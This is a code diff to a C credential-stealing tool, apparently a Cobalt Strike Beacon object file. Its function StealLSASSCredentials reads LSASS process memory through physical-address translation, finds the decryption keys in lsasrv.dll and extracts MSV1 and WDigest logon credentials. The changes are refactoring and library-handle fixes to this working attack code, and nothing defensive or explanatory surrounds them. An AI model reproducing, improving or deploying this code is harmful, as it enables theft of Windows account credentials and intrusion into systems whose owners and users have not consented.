@@ -18,13 +18,11 @@ DWORD64 GetDataSectionOffset(char* TargetModule)
         if (strcmp(pImgSectionHdr->Name, ".data") == 0)
         {
             DWORD64 Offset = (DWORD64)pImgSectionHdr->VirtualAddress;
-            FreeLibrary(hModule);
             return Offset;
         }
         pImgSectionHdr = (PIMAGE_SECTION_HEADER)((BYTE*)pImgSectionHdr + sizeof(IMAGE_SECTION_HEADER));
     }
 
-    FreeLibrary(hModule);
     return 0;
 }
 
@@ -139,7 +137,7 @@ unsigned char* RetrieveBCryptKey(HANDLE hFile, DWORD64 bCryptHandleKey, DWORD lo
     return TRUE;
 }
 
-BOOL StealLSASSCredentials(HANDLE hFile, char* pvWindowsVersion, BOOL RetrieveMSV1Credentials, BOOL RetrieveWDigestCredentials)
+BOOL StealLSASSCredentials(HANDLE hFile, DWORD dBuildNumber, BOOL RetrieveMSV1Credentials, BOOL RetrieveWDigestCredentials)
 {
     BeaconFormatPrintf(&outputbuffer, "[+] Stealing LSASS Credentials!\n");
 
@@ -153,7 +151,7 @@ BOOL StealLSASSCredentials(HANDLE hFile, char* pvWindowsVersion, BOOL RetrieveMS
     
     // Get LSASS EPROCESS address
     DWORD64 ntEprocessVA = GetNtEprocessAddress(hFile);
-    DWORD64 LsassEprocessVA = GetTargetEProcessAddress(hFile, LsassPID, ntEprocessVA, pvWindowsVersion);
+    DWORD64 LsassEprocessVA = GetTargetEProcessAddress(hFile, LsassPID, ntEprocessVA, dBuildNumber);
     if (LsassEprocessVA == 0)
        return FALSE;
 
@@ -167,7 +165,8 @@ BOOL StealLSASSCredentials(HANDLE hFile, char* pvWindowsVersion, BOOL RetrieveMS
     DWORD64 h3DesKeyAddress = 0;
     DWORD64 IVAddress = 0;
 
-    if (!SearchForCredentialKeys(pvWindowsVersion, &hAesKeyAddress, &h3DesKeyAddress, &IVAddress))
+    HMODULE hModule = LoadLibraryA("lsasrv.dll");
+    if (!SearchForCredentialKeys(dBuildNumber, &hAesKeyAddress, &h3DesKeyAddress, &IVAddress))
     {
         BeaconFormatPrintf(&outputbuffer, "[!] Failed to find credential keys!\n");
         return FALSE;
@@ -224,15 +223,14 @@ BOOL StealLSASSCredentials(HANDLE hFile, char* pvWindowsVersion, BOOL RetrieveMS
     if (RetrieveMSV1Credentials)
     {
         // lsasrv!LogonSessionList Information
-        HMODULE hModule = LoadLibraryA("lsasrv.dll");
         DWORD64 DataSectionOffset = GetDataSectionOffset("lsasrv.dll");
         DWORD64 ImageStartAddress = GetModuleHandleA("lsasrv.dll");
         DWORD64 DataSectionBase = ImageStartAddress + DataSectionOffset;
-
-        DWORD64 LogonSessionListHead = SearchForLogonSessionListHead(hFile, DataSectionBase, lower32bits, LsassPID, ImageStartAddress);
+        
+        DWORD64 LogonSessionListHead = SearchForLogonSessionListHead(hFile, dBuildNumber, lower32bits, LsassPID, ImageStartAddress);
         if (LogonSessionListHead == 0)
         {
-            BeaconFormatPrintf(&outputbuffer, "[!] Failed to find LogonSessionListHead!\n");
+            BeaconFormatPrintf(&outputbuffer, "[!] Failed to obtain LogonSessionList!\n");
             return FALSE;
         }
         
@@ -240,19 +238,20 @@ BOOL StealLSASSCredentials(HANDLE hFile, char* pvWindowsVersion, BOOL RetrieveMS
         BeaconFormatPrintf(&outputbuffer, "[i] LogonSessionList: 0x%llx\n\n", LogonSessionListHead);
         
         DisplayLogonSessionListInformation(hFile, LogonSessionListHead, lower32bits, LsassPID, Real3DesKey, i3DesKeyLength, InitializationVector);
-        
         FreeLibrary(hModule);
     }
 
     if (RetrieveWDigestCredentials)
     {
         // wdigest!l_LogSessList Information
-        HMODULE hModule = LoadLibraryA("wdigest.dll");
+        HMODULE hWDModule = LoadLibraryA("wdigest.dll");
 
         DWORD64 l_LogSessListHead = SearchForLogSessList();
         if (l_LogSessListHead == -1)
         {
             BeaconFormatPrintf(&outputbuffer, "[!] Failed to get the l_LogSessList address!\n");
+            FreeLibrary(hWDModule);
+            FreeLibrary(hModule);
             return FALSE;
         }
 
@@ -263,11 +262,14 @@ BOOL StealLSASSCredentials(HANDLE hFile, char* pvWindowsVersion, BOOL RetrieveMS
         if (!TranslateUVA2Physical(l_LogSessListHead, &tmpPA, lower32bits, LsassPID))
         {
             BeaconFormatPrintf(&outputbuffer, "[!] l_LogSessList is not yet mapped in memory. Authentication must occur for data to be available\n");
+            FreeLibrary(hWDModule);
+            FreeLibrary(hModule);
             return FALSE;
         }
 
         DisplayWDigestLogSessListInformation(hFile, l_LogSessListHead, lower32bits, LsassPID, Real3DesKey, i3DesKeyLength, InitializationVector);
 
+        FreeLibrary(hWDModule);
         FreeLibrary(hModule);
     }
 
